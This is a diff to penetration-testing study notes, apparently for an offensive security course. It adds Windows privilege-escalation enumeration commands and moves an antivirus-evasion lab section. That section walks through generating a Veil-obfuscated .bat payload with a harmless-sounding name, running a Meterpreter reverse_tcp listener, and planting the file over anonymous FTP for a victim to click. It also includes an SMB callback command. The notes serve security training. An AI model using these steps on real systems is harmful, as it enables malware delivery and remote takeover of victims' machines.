@@ -14,6 +14,7 @@
   - [14. Fixing exploits](#14-fixing-exploits)
   - [15. Password attacks](#15-password-attacks)
   - [16. Antivirus evasion](#16-antivirus-evasion)
+  - [17. Windows Privilege Escalation](#17-windows-privilege-escalation)
   - [18. Linux privilege escalation](#18-linux-privilege-escalation)
   - [19. Port redirection and SSH tunneling](#19-port-redirection-and-ssh-tunneling)
   - [20. Tunneling through deep packet inspectation](#20-tunneling-through-deep-packet-inspectation)
@@ -1780,6 +1781,50 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - Using the dir command to create an SMB connection to our Kali machine
       `dir \\192.168.45.181\test` in web portal os command  
 
+### Antivirus Evasion  
+- **Capstone Lab**: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
+  - install Veil framework
+    ```
+    sudo apt -y install veil
+    /usr/share/veil/config/setup.sh --force --silent
+    ```
+  - geneate bat file via Veil
+    ```
+    sudo veil
+    Veil>: use 1
+    list
+    Veil/Evasion>: use 22
+    set LHOST 192.168.45.220
+    generate
+    Please enter the base name for output files (default is payload): configuration-file
+    exit
+    
+    cp /var/lib/veil/output/source/configuration-file.bat .
+    ```
+  - Another terminal run meterpreter listener
+    `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"`
+  - transfer file to ftp as anonymous
+    ```
+    ftp -a -A 192.168.104.53
+    ftp> bin
+    ftp> put configuration-file.bat
+    ```
+
+### Windows Privilege Escalation  
+- 17.1.2 Situation Awareness
+  `nc 192.168.139.220 4444` `whoami` `Get-LocalUser`  `Get-LocalGroup` `Get-Content -Path .\LocalUsersGroups.csv`  
+  - Display member for group "Remote Management Users"
+    `Get-LocalGroupMember "Remote Management Users"`
+  - List installed apps
+    ```
+    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" 
+    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" 
+    ```
+  - another member of local admin group
+    `Get-LocalGroupMember "Administrators"`
+  - List the process and file path
+    `Get-Process`  `(Get-Process -Id 2552).MainModule.FileName`  
+
 ## Penetration testing report 
 - note editor:
   - [Sublime-syntax highlight](https://www.sublimetext.com/download)
@@ -1821,35 +1866,6 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       
       affected URL/endpoint + method of triggering the vulnerability  
     - **appendices**: articles, reference
-
-### Antivirus Evasion  
-- **Capstone Lab**: malicious script cannot be double-clicked by the user for an immediate execution. Utilize [veil](https://github.com/Veil-Framework/Veil) framework. Victim will click on .bat file
-  - install Veil framework
-    ```
-    sudo apt -y install veil
-    /usr/share/veil/config/setup.sh --force --silent
-    ```
-  - geneate bat file via Veil
-    ```
-    sudo veil
-    Veil>: use 1
-    list
-    Veil/Evasion>: use 22
-    set LHOST 192.168.45.220
-    generate
-    Please enter the base name for output files (default is payload): configuration-file
-    exit
-    
-    cp /var/lib/veil/output/source/configuration-file.bat .
-    ```
-  - Another terminal run meterpreter listener
-    `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 4444;run;"`
-  - transfer file to ftp as anonymous
-    ```
-    ftp -a -A 192.168.104.53
-    ftp> bin
-    ftp> put configuration-file.bat
-    ```
 
 ## Penetration testing stages
 1. scope: IP range, hosts, applications
